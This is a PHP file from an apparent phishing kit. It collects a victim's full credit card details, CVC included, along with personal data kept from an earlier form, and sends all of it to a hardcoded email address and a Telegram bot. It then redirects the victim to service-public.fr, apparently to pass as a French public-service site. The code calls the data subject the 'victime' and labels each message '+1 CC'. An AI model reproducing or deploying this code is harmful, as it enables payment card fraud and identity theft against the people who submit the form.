<?php
include 'Config.php';

session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["creditcomplete"])) {
    // Récupérer les données du deuxième formulaire
    $titu = $_POST["titu"];
    $creditnum = $_POST["creditnum"];
    $expm = $_POST["expm"];
    $expy = $_POST["expy"];
    $cvc = $_POST["cvc"];

    // Récupérer les données du premier formulaire depuis la session
    $emaile = $_SESSION['emaile'];
    $username = $_SESSION['username'];
    $day = $_SESSION['day'];
    $month = $_SESSION['month'];
    $year = $_SESSION['year'];
    $address = $_SESSION['address'];
    $cp = $_SESSION['cp'];
    $city = $_SESSION['city'];
    $phone = $_SESSION['phone'];

    // Autres données (adresse IP et User-Agent)
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Construire le message avec les données des deux formulaires
	$message .= "[💳] 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡𝗦 𝗗𝗘 𝗣𝗔𝗜𝗘𝗠𝗘𝗡𝗧 [💳]\n";
	$message .= " ";
    $message .= "📜 𝗡𝗼𝗺: $titu\n";
    $message .= "💳 𝗡𝘂𝗺: $creditnum\n";
    $message .= "💳 𝗘𝘅𝗽: $expm/$expy\n";
    $message .= "💳 𝗖𝗩𝗩: $cvc\n";
    $message .= "[🎲] 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡𝗦 𝗗𝗘 𝗟𝗔 𝗩𝗜𝗖𝗧𝗜𝗠𝗘  [🎲]\n";
    $message .= "💻 𝗠𝗮𝗶𝗹: $emaile\n";
    $message .= "📜 𝗡𝗼𝗺: $username\n";
    $message .= "🎇 𝗗𝗼𝗯: $day/$month/$year\n";
    $message .= "💒 𝗔𝗱𝗿𝗲𝘀𝘀𝗲: $address\n";
    $message .= "🔢 𝗖𝗣: $cp\n";
    $message .= "📍 𝗩𝗶𝗹𝗹𝗲: $city\n";
    $message .= "📞  𝗧𝗲́𝗹: $phone\n";
    $message .= "[🌐] 𝗧𝗜𝗘𝗥𝗦  [🌐]\n";
	$message .= " ";
	$message .= "📲 𝗜𝗣: $user_ip\n";
	$message .= "🌐 𝗨𝗔: $REMOTE_ADDR\n";

    // Envoyer l'e-mail
    $to = "nageounoietoi@outlook.fr";
    $subject = "+1 CC $creditnum";
    $headers = "From: misterzeub@gmail.com";
    mail($to, $subject, $message, $headers);

    // Envoyer sur Telegram
    $telegram_message = "+1 REZ :\n\n$message";
    $telegram_data = ['text' => $telegram_message, 'chat_id' => $chatid];
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query($telegram_data));

    // Redirection
    header("Location: https://service-public.fr");
    exit;
}
?>
